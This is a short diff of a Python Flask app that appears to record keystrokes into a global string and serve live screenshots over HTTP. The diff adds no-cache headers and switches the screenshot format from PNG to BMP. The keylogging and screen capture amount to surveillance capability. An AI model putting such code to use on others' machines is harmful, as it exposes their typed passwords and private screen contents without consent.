@@ -8,6 +8,14 @@ app = Flask(__name__)
 s = ""
 
 
+@app.after_request
+def disable_caching(response):
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Expires'] = '-1'
+    response.headers['Pragma'] = 'no-cache'
+    return response
+
+
 def press(event):
     global s
     s += event.name + " "
@@ -20,10 +28,10 @@ def clear():
     return render_template("back.html")
 
 
-@app.route("/screen.png")
+@app.route("/screen.bmp")
 def screen():
     buf = BytesIO()
-    ImageGrab.grab().save(buf, format="PNG", quality=0)
+    ImageGrab.grab().save(buf, format="BMP", quality=0)
     return buf.getvalue()
 
 
